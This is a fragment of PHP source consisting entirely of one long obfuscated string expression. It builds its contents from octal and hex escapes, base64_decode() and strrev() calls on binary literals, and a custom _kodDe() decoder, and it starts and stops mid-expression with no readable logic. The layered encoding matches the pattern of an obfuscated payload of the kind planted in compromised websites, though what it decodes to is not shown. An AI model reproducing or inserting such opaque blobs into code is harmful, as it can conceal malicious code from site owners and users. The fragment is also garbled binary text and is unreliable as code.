'."\r".'`[').base64_decode('57I2FhHD7pHs3btQr2X7d7rGUwzDIn52CjAs6g1sALzyNAh+EFVuzsyEKDXMLNjH').strrev('ö+÷¸Ye*˜åDõn'."\r".'†EâH|F£„À'."\r".'•ÎEV`'."\r".'V&<9B<«rbŸ1­Ì')."\10\353\151\245\75\302\362\230\70\206\357\66\30\117\315\134\30\37\365\164\121\63\13\361\244\245\202\155\14\25\270\233\70\350\25\215\205\172\222\61\25\235\37\361\60\306\346\60"."\42\76\255\122\177\45\276\133\136\24\150\6\27\340\136\57\277\142\150\254\114\245\241\361\372\134\362\24\356\152\217\164\205\233\72\47\42\211\120\247\302\72\16\262\65\354\34\156"."\1\264\23\211\251\121\104\23\253\262\370\54\22\3\101\156\40\45\273\71\121\205\267\224\200\46\324\277\35\253\44\71\47\64\114\242\206\335\311\355\63\210\156\70\2\210\220\360"."\x92\xc0\x85\xcd\x24\xaf\x94\xc2\xb5\xe5\xe3\xa\xea\x7b\x1c\xfc\x19\x66\x23\xce\xc1\x85\x29\x95\xb2\x50\x14\x57\x5d\x1f\xf7\xea\x61\xcb\xc9\x42\x25\x9c\xdf\xd5\x30\x4d\x74\x84\xd6\xf2\xae\xa"."\x3d\x92\x97\x3\x2d\x23\x69\x7f\x2b\xec\xcb\xe4\x12\xa9\xe0\xee\x27\x3a\x38\x73\x2a\x76\x38\x82\xf8\x42\x55\x17\xc3\xca\xeb\xb6\xcd\xaf\x92\x9\x17\xc4\x82\x4e\x56\x78\x7b\x90\x1d\x2d\xb6\x36"."\263\51\54\25\234\204\236\3\15\204\326\24\121\246\27\346\161\302\260\110\122\262\47\367\62\142\135\250\313\113\117\105\150\51\302\7\56\225\22\211\121\341\131\21\137\74\210\66"."\x7\x18\x2f\x2f\x6\x39\x69\xb0\x23\xce\x7b\xa1\xc8\x3b\x59\x30\xbb\x75\x2b\x6f\x90\xbb\x9f\x95\xc2\xa2\x87\xe7\xeb\x32\x24\x54\x9a\x60\x7f\x83\xf4\x5\xc9\xb4\x11\x47\x61\x45\xf1\xe5\xa6\x64".base64_decode('DFIqoH75ZaMitMIkUTJjYH4haWw+aDxwUyqH6UCwX4vlBIQ3G9ImJmL8wrtERpOt').strrev('™¦ÙÓ	½Í>^n—ÔªƒÄFá ­ã¨“\'š»! à@N–N+ÉGÂ%=')."\44\320\40\331\206\112\243\350\104\7\352\251\151\115\110\60\40\245\166\62\7\114\340\342\62\152\2\351\212\155\64\164\7\334\214\271\260\110\44\6\165\3\72\66\157\242\46\46"."\330\4\215\127\244\56\266\276\276\122\217\344\345\163\47\33\277\142\275\26\50\310\77\150\21\241\316\327\177\60\256\213\263\31\125\43\326\144\137\133\111\40\102\362\45\122\111\102"."\x9e\x9e\x3a\x4\x1c\xa9\x2d\xc\xac\x7c\x16\xb2\x5\x8c\x21\x8c\xdd\x15\x53\x3b\xd0\xa1\x10\x63\xa4\x83\x61\x27\x5d\x48\x98\xd5\x2\x54\xe0\x20\xca\x26\x1d\x24\xf6\xbb\xc0\x98\x2d\x24\x37\x90"."\xf4\xb6\x10\x16\x7b\x1d\xc2\xaf\x3c\xc4\x34\x37\xc0\x9f\x97\x38\xb2\x43\xf4\xa7\x37\x9f\xf1\xa3\x8e\x3\xd4\x65\x74\x87\xfb\x51\xc2\xd8\x8c\x99\x32\xe2\x3e\x4b\xd6\xcf\x79\x8e\xfd\xc6\x24\xc7".base64_decode('hdqojo3HmNijTIEGhlI+OOgivp5KxHri7A4Fx4kZbDzc0suvM3hqW2iFNyWCZX+h')."\366\212\311\134\42\205\323\11\353\247\306\143\130\164\27\216\266\171\52\44\72\270\237\111\167\232\32\215\164\55\253\230\201\10\210\116\251\12\115\214\44\303\235\336\64\167\13\211"."\x70\x28\xce\x1c\x94\xe2\x78\x73\x34\xd6\x22\x65\x47\x62\xe5\x33\xc1\x29\x14\x9e\x48\x5\x7f\x34\x31\xb8\xba\xa6\x7f\x1d\xe1\x5d\x1a\x11\xb\x93\x99\xc2\x12\x2\xbf\x3a\x50\x57\xbb\xa4\x7f\x7d"."\x6d\x4d\x7f\x70\x49\x60\x26\x17\x6c\x51\x74\x25\x19\xcc\xee\x24\xd9\x66\x87\x48\xa3\x37\x1\x9f\x3f\x2c\x91\x56\x83\x58\x30\x10\x80\x8f\xf0\x40\xb0\x3f\xc8\x9d\x75\xb1\x3\x2\x9c\xff\x26\xa8"."\133\43\127\57\74\376\76\230\41\175\300\353\327\122\305\46\270\52\337\117\370\316\123\115\364\46\370\314\123\60\254\224\357\202\65\132\114\126\201\360\24\106\177\273\345\242\130\353"."\xa6\x62\x41\x17\xb0\xba\x4c\x90\xe5\xa4\x80\x61\x8a\x7d\x20\x36\x6c\xc6\x4c\x97\xb0\x17\x25\x31\xfb\xc2\x60\x19\x25\x5\x5c\x4d\x20\x54\x3d\x2c\xd8\x6c\xd8\x6f\x9\xb6\x2f\xb\xe8\x14\x84\x63"."\266\5\121\215\355\35\221\245\313\242\235\135\261\356\345\361\104\262\147\305\312\125\275\307\303\114\63\160\30\124\374\314\11\32\170\317\14\216\152\126\160\224\171\175\136\201\211\176".base64_decode('3Q7KxBRPRGNEqI4hqiCVBfBcjBeClbNoa8F8wWnYSYluS0+ZprOT3BWdX90wZPb1').base64_decode('2wMM/oIZfRSCQs3NFqwOkA9+2fs0BlWZosukPOc8JAjdD4kaEImzmH5hrz/vz/Qn')."\333\261\213\314\376\343\371\132\33\226\344\243\62\155\26\62\206\344\5\101\113\63\342\255\224\36\346\56\7\60\346\267\375\143\6\203\246\143\70\377\7\152\126\252\226\246\374\260"."\244\142\70\342\307\354\220\137\313\15\231\210\160\313\346\131\252\66\354\312\27\336\117\213\146\316\140\156\353\106\374\350\23\122\36\55\214\32\147\347\47\126\147\340\236\143\161\304"."\346\61\171\213\221\23\206\153\3\341\163\254\303\263\273\171\42\367\153\233\40\203\150\124\346\200\363\347\66\104\121\113\246\241\314\375\256\240\270\60\225\106\374\35\323\250\117\21"."\x6e\xe3\x99\xbc\x94\x32\x21\x47\x79\x36\x1c\xf1\x96\x23\xc8\xf0\xb4\xec\x22\x81\x21\xe6\xfc\xb0\xd0\xef\xc9\xf\x73\x8d\x8d\xb4\x8b\x30\xc1\x34\x80\x88\x59\x12\xed\x1\x1e\xdc\x51\x5e\xf3\x4"."\xd3\xf1\x2\xf3\xd2\xe6\x89\xb8\xf4\x0\x85\xcb\x57\x85\xec\xf3\x3e\xb4\x32\x31\xc7\xdf\xd1\x19\x6a\xf1\xa3\xe3\x65\xd6\x5c\x50\xa\x46\x87\x7a\x7f\x12\x9d\xea\xc\xb0\xb4\x31\x7b\xe\x63\x64"."\x68\x4a\xdd\x3c\x25\x8b\x56\x2\x20\xa6\xdc\x8b\xec\x31\x6e\x8f\xca\x34\x91\xba\x45\x4d\x5b\x7a\x6\xeb\xb5\x30\x2a\x92\xa6\x7a\x20\x89\x26\xa\x3c\x41\xe3\xd4\xdd\x1e\x80\x20\xda\x19\xbc\xc3".base64_decode('eBg0VOm7qyp+d1Wl767yfHdV+XdpkgditWKxJYthwYVNXUlpOcJOtUGstyNr/4Bo').base64_decode('lSobB1B2KyWoM7y8LUJ8VwxK+8XVXABQPlQPYq0CGsxptrPC5TXpa30ZY38fnZx5')."\xe0\x74\x6b\xd0\xb4\xed\x20\xf6\xf4\x48\xa8\x75\xae\x55\x17\x4b\xb0\xcb\x23\xf7\x98\xa8\xaa\x91\xc4\xe5\x83\xb3\x39\xee\x88\x97\xbb\xe9\x15\xbe\x7c\xa9\xcc\x9f\x86\xc3\xdc\xe9\xd\x62\x3a\x42"."\103\330\215\11\302\163\60\53\341\361\242\151\353\262\223\350\214\116\74\217\162\273\175\311\343\162\136\33\307\230\310\146\61\341\173\231\171\62\226\335\76\342\11\363\347\135\276\342"."\307\375\150\350\36\357\305\266\256\17\63\225\110\211\1\341\322\206\156\356\225\330\73\34\214\12\4\122\264\270\107\152\172\135\354\257\230\340\227\74\141\120\154\40\171\65\107\375"."\x82\xa6\x71\x37\x61\xff\x66\xc9\xdc\xc0\x98\xd3\xf4\xe7\xf8\x4a\xa3\xf6\x5b\xc2\x4d\x34\x5a\x4b\xfa\x16\xc1\x32\x7d\x82\xb9\x60\xf6\xec\x0\x8f\xd7\xe6\xfe\xf6\xfe\xce\xfe\xa4\x3c\x4d\x8e\xa5".strrev('ì¤‡y ½ÉÆ7ÎcDZã„™'."\r".'PôTfEnbîv2lóÈü¢N}]`Kn¢'."\r".'')."\x2e\xc7\xe9\x0\xbd\x83\x42\xcd\xae\x58\x92\x9e\xc2\x91\xe1\x5\x1f\xe3\x6c\x4a\x89\xa4\x82\x3a\xf6\x66\x28\x83\x38\xdc\x6\x87\xfe\x4d\x6c\x44\x68\xea\xa\xcd\x66\x6\xce\xc4\x75\x55\x8\x12"."\xab\x1a\xab\x8e\xa9\x41\xbf\xb5\x55\xbe\x2a\x4c\xa8\x92\x38\x5e\x45\x9c\x40\xfa\x51\xd5\x78\x4c\xd\x9\xd4\x82\x43\x9a\x49\xb0\xd4\x90\x7c\xde\x8a\xab\x78\x90\xb2\x2d\x41\x53\x2b\xdd\x1f\x2d".strrev('ùWæ…lîZOx:s—Y‡ZùTEîÇ´"®0ïUâ‹ø#%ƒàà¬à¬ş÷³!').base64_decode('Q53H+4UX6kVLxvM5BbjMpuqGQH21wl5taaruSbb5F1QvWbzXohZym+zonfg6GMtA')."\50\363\277\30\156\173\26\341\355\305\43\101\167\154\147\165\1\376\362\332\244\131\100\107\35\302\120\371\100\32\46\263\207\143\61\341\30\274\240\73\143\246\5\127\345\200\140\147"."\325\317\221\141\32\100\304\146\133\233\10\234\32\261\200\224\15\277\247\70\121\52\370\261\10\302\237\220\75\24\172\236\42\250\167\227\307\102\4\167\171\31\65\246\5\372\310\213".base64_decode('IH1WolGR3xqR3C4TARXdlUzrA9Iw1mRJhlvzdIqjRNWNEo/z9BdPtR8RXRj+0aZC')."\307\257\243\127\52\342\176\320\302\373\314\205\167\26\110\25\274\270\176\371\375\214\161\104\161\343\154\354\111\337\217\327\327\157\144\166\226\43\66\165\305\256\246\1\124\52\25\351"."\51\31\31\357\47\211\166\202\277\124\142\37\254\330\250\314\17\260\2\144\20\21\336\236\213\62\327\320\132\163\142\334\113\334\113\2\351\162\357\364\150\363\52\263\146\67\316\75"."\26\375\117\123\146\60\345\212\122\221\251\117\243\40\363\136\177\124\160\220\341\1\361\302\5\33\33\136\160\311\335\277\53\131\114\43\337\341\14\201\270\312\211\336\272\336\116\201"."\x81\x52\xfe\x5d\x7a\x96\x80\x48\xce\xe9\x4e\xc2\x2a\x47\x2a\x7f\xc6\xa1\x2\x26\x45\xcc\x18\x80\x68\x1\x8e\x5d\x49\x81\x9e\x2f\xc8\x10\xb\x58\xbc\xbc\x26\xb6\x48\x2a\x37\x2c\x46\x92\xc2\x9a"."\342\0\341\303\250\243\246\40\263\310\221\53\213\245\263\245\302\160\223\224\251\70\246\251\344\265\302\4\160\3\323\355\306\351\366\102\374\241\246\351\201\71\203\66\212\320\14\341"._kodDe('LwajEo60sWQR8ujjKA+Nzm/4SzLPTRlBcajMbgGSDrE3sr9X3Wo+OpN7wQGBhcMdxQ==').strrev('-?ÁIG€‚«‹®f•¶)V§'."\n".'©£°ØÒR‘‘hh¶ã3Y€AZ±'."\n".'‚V1]İÔ5')."\62\240\112\65\256\242\14\42\60\361\223\20\315\256\136\274\50\150\54\346\223\55\34\54\131\246\260\133\11\4\217\306\334\124\20\353\36\25\146\340\325\225\125\41\110\152\233\160"."\247\244\50\213\64\205\316\143\123\65\221\203\127\53\131\164\36\163\305\313\305\336\312\135\354\76\152\121\120\223\63\361\316\212\233\214\374\345\114\24\26\263\173\222\344\253\214\220".base64_decode('5OicvHfRohVWlFfBjQfSchZdSWJZU14+SCQBQcEvuu96+NVIBaAoaulhDEcC6cOX').base64_decode('IKMbMyY0w/VsgyNpfJSwbRkRrVvibZl162hD+Jxfv748DZRGvVmhouFNwvDiTcOM')."\xb6\x48\x43\xa7\x97\xfb\x33\x14\x56\xe5\x42\x22\x85\x95\xa1\xbf\xa2\x4e\xb4\xab\x5d\x44\x28\x23\xe2\xca\xec\x63\xfa\xd9\x24\xd6\xdf\x57\x1d\x98\xb9\x7e\x7d\xd0\x60\xaa\x55\x4c\xd\x84\xd5\xd"."\xf0\xd2\x34\xde\x1f\x70\x97\x47\x23\x81\xa9\xe7\x5\x21\xc1\x5b\x92\x52\x8d\x4b\x61\xcb\xed\x15\x9c\x29\xec\xe1\xb8\xa\x95\x82\xf5\xaa\x9a\x9a\x16\xf7\xf1\x8b\xa3\x1\x96\xc7\x48\x3f\xa3\x61"."\1\133\364\311\254\77\271\222\7\133\272\4\161\313\101\233\142\221\0\21\222\204\334\256\215\227\214\362\127\123\350\254\312\341\120\261\50\107\331\123\100\344\126\41\147\244\202\174"."\217\323\233\206\100\132\230\221\261\42\4\303\170\322\261\376\223\47\3\33\121\221\344\121\204\2\21\255\265\326\233\216\332\342\211\74\260\310\116\133\106\321\161\141\47\372\120\142"."\x15\x79\xd5\x66\xad\x36\xaa\xd1\x22\x55\xa\x70\xe5\x4d\x55\xc4\xab\x7f\x15\xc2\x46\x34\x7\xd0\x80\xe8\xca\x22\x8c\x76\x14\x4b\xcf\x35\x55\x91\xee\xda\x59\x5d\x47\xf5\x9\x62\xa9\xf4\x11\x54"."\261\112\141\70\61\257\361\31\263\34\23\35\167\334\154\10\336\230\352\211\203\145\105\250\13\156\162\216\136\115\177\217\71\232\101\10\171\351\54\247\133\124\157\234\40\31\162\207"."\70\50\104\130\360\326\125\167\74\226\214\265\260\247\201\52\311\272\346\60\162\325\246\246\167\202\255\141\326\77\134\275\202\225\340\4\100\20\122\140\335\255\122\241\300\65\325\60".strrev('ˆo%’c»bHßˆ‰Är["Z%é\\T	Îìiô -ÜØ6I*SØºÄM.¢ù¬)OÈE').strrev('Ÿú}zúú¬äAÌ™Îß ñ%Ázf'."\n".'ä›ìTB²Pa6€S‘™ê›&Š¨j#Ø').strrev('à¥ël¾¨ˆÄ¡Fò8!Ğë¦0(-aŸ›AÎâ‹hD§şHß_R*_òÌW3H©').base64_decode('rsGQhYIcWg/it5EhkIUS67dQIZeLENO9k8BvbWGFZcffLIxoGbTaZFKgv9w8EBUT').base64_decode('cLSQ2ok28U6FC5k++WMBNrk0UTir9rMMv/y4BFSiR4O4tnB1DdVxO4TEKehgTvNx')."\xe2\x4\x49\x42\x82\x9\x33\xc9\xc9\x25\x8e\xca\xb7\x13\x24\x9b\x5b\xe3\x91\x58\x8e\x3b\x22\xc0\xd1\x2e\xde\x12\x7d\xc3\x84\x5a\x72\xc2\x1c\x56\x0\xd7\xac\x39\xa6\x8a\x53\x18\x47\x97\xf2\x18"."\x99\x52\xcc\x22\x31\x30\xcc\x48\x16\x93\x78\x5e\x61\x2a\x31\x1d\x9\xf5\xa5\x8a\x5c\xbe\x24\x94\xc\x40\x67\x82\xd8\xec\xf\x1b\x39\x97\xa5\xb2\x2a\x55\x95\x67\x79\x21\x2e\xc8\xc6\x94\x74\xd7"."\304\15\241\275\35\342\157\272\120\145\106\326\113\5\66\41\215\22\47\326\344\71\76\252\177\332\270\127\331\62\73\336\45\46\253\145\231\302\354\270\114\205\210\305\244\65\143\262"."\xf2\xc4\xd7\x68\xf9\xb0\x94\x30\x4b\xa0\x7a\x31\x2d\xdc\x53\xa4\xd4\x80\x37\xcb\x53\x27\x44\x45\xec\x65\x15\x20\xbd\xbc\x34\xb9\x96\xa8\x50\x1a\xa7\x7b\x4a\x13\x1f\x91\x2d\xdc\xd1\xad\xec\x38"."\222\352\14\110\172\52\66\70\363\27\112\2\254\215\121\211\217\12\24\55\163\10\255\272\55\117\32\112\357\256\234\314\213\227\227\254\120\210\367\136\56\47\47\342\73\17\366\50"."\x26\x0\xb6\x30\x30\xd6\xc4\x9b\xbc\x52\x51\x61\x6a\x2d\x25\xba\xf7\xb5\x94\xd1\xc2\x9f\x5e\x92\x13\x31\x5f\x26\xab\x85\x10\xad\x5e\x77\x1b\x98\xe1\x73\xa7\xf0\x9e\x7d\x5\xd0\x31\x46\xdd\x81"."\7\124\145\235\106\132\114\340\46\54\104\221\105\275\252\13\114\30\254\62\55\24\74\103\342\126\330\235\116\323\50\53\355\272\110\112\22\224\227\323\331\173\256\64\225\156\52\334"."\0\321\326\361\114\252\330\10\260\165\233\232\344\152\356\274\67\116\71\227\5\316\143\245\360\264\162\111\240\54\42\307\123\252\312\122\16\274\243\73\370\63\242\25\0\321\15\154".base64_decode('ZVBFKAXcAPQG7WYphlsHROZD7J5NBXI+nKzQtzWVgs4NwN2LKleAB5BMRFlht7Ny').base64_decode('JdxWjwdFLXNhRN7XPtJZpgmnTA/MAjQ9nb1oQPGxuPINwrD70LAGEHk/xc8VWJA+')."\x8a\x8d\x59\x9b\xb8\xcb\x10\xca\xb0\xf5\x19\x29\xe9\x8c\x66\x97\x4e\xc\x45\x6a\x4\xd0\x76\x32\x6b\x99\xe\xe7\xe7\x70\x7e\x28\x23\x9d\x82\x51\x99\x70\x4b\xd2\x2a\xfe\xc5\xe2\x3b\xae\x1b\x44"."\xc9\x3f\x37\x2f\x8a\x4e\x78\xf6\x75\x8d\x9d\xfa\x44\x9d\x8c\xf8\x37\x97\x58\x4c\x4f\xd4\xab\x7c\x47\x4e\x68\x87\x1d\xb2\xcc\xe1\xb9\xd0\x4b\xc3\xcb\x98\x90\xb4\x95\x2a\x7c\x1\x2a\xf1\x2a\x40"."\72\130\172\332\264\210\204\101\362\113\121\160\342\372\220\34\215\232\134\262\202\157\254\364\12\115\140\127\100\322\66\307\120\217\170\376\222\354\130\110\362\213\216\142\222\3\174\211"."\4\364\67\50\234\166\124\151\313\64\122\47\145\220\362\225\310\110\217\174\117\62\12\41\42\215\104\51\305\257\131\74\304\35\263\63\121\144\332\211\31\216\340\6\210\217\27\74".base64_decode('AlvOQ81i38ViZHIV8s2yKjQPky/CU4qcY2PP9j1s2SrlVPgUyZJmNM39RcHsiEmC')."\214\11\235\51\150\372\33\146\371\147\63\317\140\262\157\46\340\37\150\14\63\61\22\30\140\126\213\241\15\120\157\204\162\242\214\51\135\126\21\357\51\302\207\3\161\24\303\327".strrev('w¨gEîÎÃ;@õaÒêİœ!>R§ \\HPèThÈ«\\Hú®u»:K1á”x“')."\xd3\xa5\x79\xe4\x69\x4\x1e\x52\x90\x9d\xf8\x93\x5a\x62\x1c\x42\x91\x17\x25\x99\xd4\xa5\xbe\x34\x31\x42\x37\x82\x3a\x9d\x61\x1a\xc9\x1c\x2f\x89\xe4\xa4\xc9\x13\xcb\xf5\x2b\x2\x5c\x23\x1b\xcc".base64_decode('c+El0ppabJ7rkmh1TnAjSqz9hA9FrrlqyxGWy4HTdkWotperNk/ipcZ0ZmnLJC/d')."\35\335\101\236\324\314\267\47\145\332\205\257\253\26\246\122\245\217\353\151\150\53\157\244\225\150\254\75\322\22\212\266\106\22\313\224\41\335\121\204\42\10\171\10\303\275\225\211"."\170\221\116\74\203\352\24\177\223\1\7\375\51\104\241\373\63\234\237\261\5\347\42\351\274\111\217\137\271\233\245\360\247\133\145\55\26\260\1\115\256\254\16\26\232\126\50\235"."\23\322\104\251\160\321\322\313\313\117\350\330\160\100\352\261\124\241\124\241\67\120\276\362\27\310\303\31\162\151\104\170\350\205\235\165\336\50\214\32\266\41\66\76\253\61\41\267".base64_decode('HmrtjHSpoWg0ttKlGyjExRZ/piQjv2oirYxYBPr1chds4MBKdi7vEWDQ5ZNd8RXZ')."\345\7\74\343\310\37\71\240\121\351\211\242\242\245\31\266\56\45\320\227\163\146\202\275\212\226\313\271\36\47\314\15\112\321\222\373\144\255\370\51\225\176\200\245\111\336\376\52"."\25\210\343\127\347\377\307\135\65\62\302\353\226\221\141\72\30\334\274\220\276\177\320\42\77\144\311\276\131\366\14\323\327\76\350\344\23\327\105\52\361\23\304\336\225\63\11\373".base64_decode('AbQxTYvEVOrmSXwCMcbWRFG+rwtm2Cs1jLjEzgXD7JIIRwQjgItDa/hzlD1EXC8W')."\x77\x31\x96\x81\xe9\x7a\x22\x3c\x1\xf3\xec\xba\xaf\xf6\x3c\x4d\xe5\x55\x8b\x75\xbd\x5\x5f\xf6\xd\xf2\xa\x2\xcd\xeb\xc3\xc3\x41\x25\x7\xc4\xe0\x50\x8c\xbf\x69\x22\xaa\x7a\x73\x2a\x74\x0"."\145\53\102\232\304\13\50\115\112\75\175\45\215\277\122\241\54\142\306\322\342\3\304\35\130\70\137\164\134\254\163\207\254\377\56\255\15\115\40\224\216\140\215\260\46\221\231\237".strrev('İÓ!I	™¤TŸÿ«Du?”î¼Cî)·Ğ3#ùå4QÑ¿õ\\_¬¢‰pK(').base64_decode('SHmHbO9RJ8gu/IpT1hxzP3iIU7zvNrlebJI2DbHpld+Yclfylb2VopCXbBUE6rCK')."\330\21\224\55\157\123\351\323\323\351\117\77\374\262\343\314\333\11\212\250\340\223\265\34\250\132\262\106\56\143\161\325\30\221\320\251\13\306\234\324\302\332\41\32\173\261\227\74"."\377\6\303\345\317\263\124\172\331\13\273\366\163\277\67\43\236\361\21\147\247\373\241\23\176\301\153\213\315\140\73\256\207\164\222\146\122\33\362\121\212\14\143\65\21\153\236\220"."\xc3\xb2\x3a\x2c\x19\x5\xca\x84\x89\x34\x32\x7c\xbd\x17\x4b\x5\xd8\xfb\x79\x19\x1f\x79\xdc\x8d\xa2\x3a\xef\xfb\x2f\xd2\x4e\xe3\xf8\x53\xae\x3d\x94\x33\x53\x5a\x2e\x4e\x35\xca\x5c\xa6\x2f\x16"."\342\246\270\226\250\253\30\115\12\152\305\242\270\212\222\217\114\364\257\313\366\20\362\172\222\35\52\261\240\127\351\215\165\102\300\234\164\211\105\23\341\102\253\124\210\120\371\277"."\x2b\xd5\x92\xf8\x3c\x59\x95\x99\x5e\xdd\x9\x23\x37\x28\x8e\xfa\xd9\x4d\xef\xea\x60\xc2\xe4\x26\xd9\xfd\x29\x17\x46\xb7\x49\x2f\xbb\x7\xcb\xef\x5b\xb1\xae\x1c\x60\x14\x59\x95\x14\x2e\xbc\x3"."\62\43\6\5\224\105\212\0\15\327\106\306\240\204\250\141\37\11\20\114\41\23\356\137\221\312\41\330\375\266\20\5\165\362\323\252\17\162\56\6\307\305\151\56\273\375\20\332"."\x15\xde\xe7\xf1\xd8\x67\xf8\xeb\x7e\x3e\x3a\x32\xf1\xaa\x2b\x7d\xcb\xcf\xc7\xdf\xed\xf3\x51\xf\x92\x3e\x78\xad\xcf\x27\x8c\x15\xbf\xea\x79\x22\x61\x52\xe7\x7e\xe5\x19\xf7\x99\xeb\x5e\x96\xb1"."\x13\x5e\x4e\x82\x4f\x95\xa7\x42\xdc\x3b\x71\x49\xb3\x5c\xc6\x2a\x6e\x99\xb\xa5\xbc\xb8\xad\x47\x11\x37\x67\x55\x36\x60\x69\x84\x25\x2b\xe7\x23\x77\xec\x3e\xe6\xc\xcf\x33\x1d\x62\x54\xf2\xca"."\124\230\303\257\157\203\252\340\22\166\51\343\306\127\215\213\122\26\273\247\364\26\63\134\120\247\132\272\260\263\241\376\114\313\120\173\157\76\63\153\366\334\143\145\261\204\130\37"."\x71\xa9\x37\x9b\xfe\xc0\x25\x24\xd0\x19\x62\xc5\x95\x29\x17\x3c\x29\xcc\x89\xaa\xbc\x6f\x49\xa6\x5b\x3b\xba\xfc\x59\x4d\xf\xee\xfe\x9f\x41\xbe\xa0\xfb\x69\x51\x49\x57\xb9\xfc\x79\xe2\xb2\x19"."\40\100\50\151\361\110\107\231\107\145\303\304\72\25\266\330\76\364\360\22\217\151\272\277\105\17\376\12\343\20\237\225\166\2\175\353\320\314\141\356\70\217\245\334\216\245\271\131"."\301\112\34\17\231\11\306\136\31\344\311\161\335\333\167\62\61\40\7\21\331\22\113\44\267\350\230\136\41\16\256\216\117\64\42\103\214\25\162\160\340\142\43\154\261\247\44\224"."\xf2\x3f\x58\x40\xc6\xdd\x50\x46\x48\x28\xec\x54\x18\x79\xf0\x38\x86\x37\x2a\xbc\x65\x29\xe9\x3f\x7c\x45\xbf\x29\x5d\xc6\x39\x39\xbf\xe6\xf8\x25\x80\x94\x4\x7f\xba\x13\x23\xb\x4c\xa3\x12\xc3".base64_decode('6R6rp3lUTbQx4FN2VqicOJOevBRuuiSyDNdmBpk74dcZcpIf83SygvGgO9S1WyXX')."\304\262\225\32\151\110\336\6\345\115\113\157\33\12\21\16\221\371\300\40\140\17\23\357\243\304\122\61\324\316\255\27\65\111\311\312\55\127\302\263\53\75\147\153\312\141\61\353"."\30\237\307\230\3\126\364\165\27\137\210\342\255\236\247\216\11\126\362\276\177\314\246\210\240\2\201\345\44\43\130\27\23\302\337\177\163\61\45\266\367\211\107\104\232\311\116\233".strrev('ÛİJø<öÙÌùÙå7v0­—LğÿÂXÂHˆ¼¥]B’d´é5úvmN8o”Q')."\xd2\x30\x23\xd3\xff\xaf\xdf\x34\xfc\x7f\xf5\x94\xe1\x5c\xfe\x8c\x8a\xeb\xc1\xe4\x76\x20\x96\xa1\xb7\xf8\x2e\x90\xb\xf\xa8\xc8\xd6\x33\xe\xf7\xa1\xb9\x27\x40\x11\x7f\x1b\x5c\x8a\x73\x95\x5d"."\346\162\214\171\42\323\330\125\221\226\313\111\107\153\145\366\242\354\245\131\4\174\303\374\231\322\112\21\257\151\234\367\325\331\76\366\176\73\171\120\166\240\122\101\201\171\70\27"."\x53\x1\x8e\x69\x12\x23\x5e\xb\xe5\x37\xbb\x78\xbd\xa2\x6e\xb7\xd2\x12\x91\x51\x56\x4c\x7c\x15\xd1\x22\xcc\x7b\x5b\x90\x85\xd2\x98\x61\x23\x9e\x14\x60\xbe\x64\x9b\xd8\x58\x91\xb1\x76\xb5\x80"."\331\7\340\27\54\354\1\53\311\230\310\225\124\206\277\222\256\125\160\45\312\23\14\253\206\115\212\331\2\272\152\164\172\136\315\244\205\154\171\66\135\302\365\362\213\376\362\332"."\x7c\xe7\xcb\x55\xb0\x6e\xb4\x5b\xde\xc4\x5f\x4a\xaf\xf7\x3e\x9d\xde\xe0\x2f\xff\x18\x35\x4d\xc0\x22\x8f\x38\x16\x32\x30\xb1\x11\xb9\x7f\x21\x17\x9f\x15\xea\x50\x48\x4d\x88\x32\x3b\xd9\x2b\x95"."\167\54\177\255\124\310\320\160\110\36\57\333\371\335\226\111\10\72\167\52\27\274\110\12\252\322\133\336\323\3\162\217\45\304\352\271\317\100\134\226\270\340\63\114\342\365\236\125"."\355\351\254\41\126\66\0\261\210\111\150\63\305\332\113\17\145\343\75\45\74\105\142\277\136\104\326\67\45\235\332\314\360\115\322\33\207\44\227\104\316\226\37\30\161\327\304\226".base64_decode('AO69tLhSsbRp2VIxnl6pLIYwWeIg5+FHjR3XWogHDLwPFxA+nLLWLg4b7mDlJOmK')."\x12\x11\xdb\x19\xf7\x4b\x28\x24\x93\x24\x33\xa7\xa2\xd0\x82\x74\xc9\xe6\xbe\xe3\xe4\xee\xd3\xcb\x30\x65\xc9\x88\x4a\xd9\xa4\x16\xf3\x55\x87\x7e\xb1\x71\x60\x44\x78\xa0\x20\xd9\xf4\xfa\x20\x24"."\275\227\355\255\345\176\147\135\272\21\115\23\310\13\227\137\172\211\273\70\211\316\140\325\60\47\44\216\0\117\172\245\227\302\7\265\121\101\44\11\132\74\223\151\323\106\53\24".base64_decode('zTBuhKeiFF6UEFmSvbFQY9fHvE8nB2QbZVfB8lRhjyzVF9cfYpg4rdLwyUZzV5ft')."\x9d\x39\x50\x89\x24\xfa\x96\x5\xd7\x97\x92\xf8\x1e\x6c\x8e\x21\x14\xa9\xe8\x50\x38\x13\x2f\x3e\xe9\xb6\xae\xe6\xc5\xf8\x9a\xa1\x32\xc4\xf8\xc5\xef\x4a\xf5\x70\x72\x58\x24\xc2\x28\x6\x4f\x16"."\x48\x10\xa4\xe6\x2b\xa\x1a\x24\x10\xd0\x73\x51\xa9\x39\xf9\x12\x74\xa7\x15\x12\x95\x3f\x22\xa0\xd2\x3d\xc5\x92\x59\xba\xc8\x60\x47\x9d\xdc\x8a\xb\x45\xf2\x81\x41\xc9\xb8\x9c\xe9\xea\x8e\x77"."\x69\x9\x13\x22\xc0\x97\x26\xe6\x89\x0\x96\xe6\x85\xdc\x59\xb4\xbc\xee\xe9\xbd\x5c\xc1\x3b\x32\x5a\xc3\x1e\x33\x9c\x74\x56\xe2\x8c\xca\x33\xcb\xd3\xad\xb2\x49\x85\xf\x55\xee\xaf\xb7\x57\x6c"."\x4e\xbd\xfc\xa2\x68\xa4\xac\x3f\x92\x26\x45\xd2\xac\x50\x87\xf6\xa8\x62\x35\x9a\x85\x6b\xa\x72\xd5\x55\x77\x27\x53\x80\xeb\xd2\x2c\x5c\xb7\x2c\x9b\x55\x96\xc4\x2b\x52\x3d\x47\x2b\xd9\x3b\x19"."\136\371\344\201\314\41\123\141\300\36\316\234\26\335\331\174\126\54\134\376\71\200\70\157\151\42\244\250\334\13\41\133\360\334\150\127\352\105\305\302\73\355\205\50\355\71\5\52"."\xe1\x5a\x96\x53\x1\xbb\xa\xd5\x86\x72\x3c\x2e\xf2\x2a\x28\x5a\xd0\x36\xf1\x19\x2d\xbb\xa8\xaa\x90\x2d\x6b\x6d\x54\xd6\xeb\x88\x57\xdc\xfa\xb6\x5b\xe1\xc2\x93\x2e\x4f\xc\xb8\x3a\xa5\x11\xa6".base64_decode('iYU4xZwxLHTQmCb5dBd+LxWGCyY/MzJCPxDrNocs70SWteaG00JJ8h5bUbHdh/n6').base64_decode('cg46pzGZvWQRQFke0zHSuttFreypiuazj+Qk2aBHLCekDC6FgAqCK5JEgwEh/qbt')."\211\261\110\60\341\262\304\240\164\2\134\11\320\333\304\26\174\153\315\357\221\210\173\125\172\